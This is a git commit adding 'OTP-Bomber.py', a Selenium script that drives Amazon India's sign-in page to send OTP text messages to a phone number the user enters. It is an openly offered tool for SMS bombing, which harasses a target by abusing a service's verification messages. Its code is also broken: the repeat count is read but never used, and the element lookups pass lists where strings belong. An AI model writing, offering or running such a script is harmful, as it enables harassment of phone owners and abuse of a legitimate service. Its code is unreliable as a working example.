f3a4cddd96da1250eb7a6668d03930f76d10ceec
nagln <laxminagln@gmail.com>
2020-08-25 11:35:52 +0530

    Update OTP-Bomber.py

--- OTP-Bomber.py
+++ OTP-Bomber.py
@@ -1,1 +1,18 @@
+from selenium import webdriver
+
+browser = webdriver.Chrome('path to driver')
+
+phone_num = input("enter your phone number:")
+times = input("enter number of times:")
+
+browser.get("https://www.amazon.in/ap/signin?_encoding=UTF8&openid.assoc_handle=inflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2Fgp%2Fyourstore%2Fhome%3Fie%3DUTF8%26action%3Dsign-out%26path%3D%252Fgp%252Fyourstore%252Fhome%26ref_%3Dnav_AccountFlyout_signout%26signIn%3D1%26useRedirectOnSuccess%3D1")
+
+phone = browser.find_element_by_id(["ap_email"])
+phone.send_keys(phone_num)
+
+cnt = browser.find_element_by_id(["continue"])
+cnt.click()
+
+sendOTP = browser.find_element_by_id(["continue"])
+sendOTP.click()
 
